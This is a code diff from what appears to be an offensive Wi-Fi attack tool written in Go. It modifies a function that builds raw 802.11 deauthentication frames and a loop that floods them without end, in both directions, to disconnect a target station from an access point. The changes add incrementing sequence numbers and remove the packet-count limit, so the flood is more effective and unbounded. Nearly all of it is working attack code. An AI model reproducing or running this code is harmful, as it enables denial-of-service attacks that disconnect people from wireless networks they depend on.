@@ -73,23 +73,24 @@ func macSplit(mac string) []string {
 	return out
 }
 
-func craftDeauthFrame(bssid, station []byte, reason uint16) []byte {
-	radiotap := []byte{0x00, 0x00, 0x0C, 0x00, 0x02, 0x00, 0x00, 0x00, 0x14, 0x00, 0x00, 0x00}
+func craftDeauthFrame(bssid, station []byte, reason uint16, seq uint16) []byte {
+	radiotap := []byte{0x00, 0x00, 0x0C, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}
 	fc := []byte{0xC0, 0x00}
 	dur := []byte{0x01, 0x3A}
-	seq := make([]byte, 2)
+	scVal := (seq & 0xFFF) << 4
+	sc := []byte{byte(scVal), byte(scVal >> 8)}
 	frame := radiotap
 	frame = append(frame, fc...)
 	frame = append(frame, dur...)
 	frame = append(frame, station...)
 	frame = append(frame, bssid...)
 	frame = append(frame, bssid...)
-	frame = append(frame, seq...)
+	frame = append(frame, sc...)
 	frame = append(frame, byte(reason), byte(reason>>8))
 	return frame
 }
 
-func (a *RealAttack) Deauth(iface, bssidStr, stationStr string, count int) error {
+func (a *RealAttack) Deauth(iface, bssidStr, stationStr string) error {
 	a.mu.Lock()
 	a.Running = true
 	a.StartTime = time.Now()
@@ -132,6 +133,7 @@ func (a *RealAttack) Deauth(iface, bssidStr, stationStr string, count int) error
 
 	fmt.Printf("[GO-RAW] Deauth: %s → %s on %s (infinite, Ctrl+C to stop)\n", bssidStr, stationStr, iface)
 	pktCount := 0
+	seq := uint16(0)
 
 	for {
 		select {
@@ -141,9 +143,10 @@ func (a *RealAttack) Deauth(iface, bssidStr, stationStr string, count int) error
 		default:
 		}
 
-		frame := craftDeauthFrame(bssid, station, 7)
-		_, err := syscall.Write(fd, frame)
-		if err == nil {
+		frame := craftDeauthFrame(bssid, station, 7, seq)
+		seq = (seq + 1) & 0xFFF
+		n, err := syscall.Write(fd, frame)
+		if err == nil && n > 0 {
 			pktCount++
 			a.mu.Lock()
 			a.Packets++
@@ -151,9 +154,10 @@ func (a *RealAttack) Deauth(iface, bssidStr, stationStr string, count int) error
 		}
 
 		if targeted {
-			frameCl := craftDeauthFrame(station, bssid, 7)
-			_, err := syscall.Write(fd, frameCl)
-			if err == nil {
+			frameCl := craftDeauthFrame(station, bssid, 7, seq)
+			seq = (seq + 1) & 0xFFF
+			n, err := syscall.Write(fd, frameCl)
+			if err == nil && n > 0 {
 				pktCount++
 				a.mu.Lock()
 				a.Packets++
@@ -171,7 +175,7 @@ func (a *RealAttack) Deauth(iface, bssidStr, stationStr string, count int) error
 func (a *RealAttack) ExecuteAttack(attackType string, params AttackParams) error {
 	switch attackType {
 	case "deauth":
-		return a.Deauth(params.Iface, params.BSSID, params.Station, params.Count)
+		return a.Deauth(params.Iface, params.BSSID, params.Station)
 	default:
 		return fmt.Errorf("unknown attack type: %s", attackType)
 	}
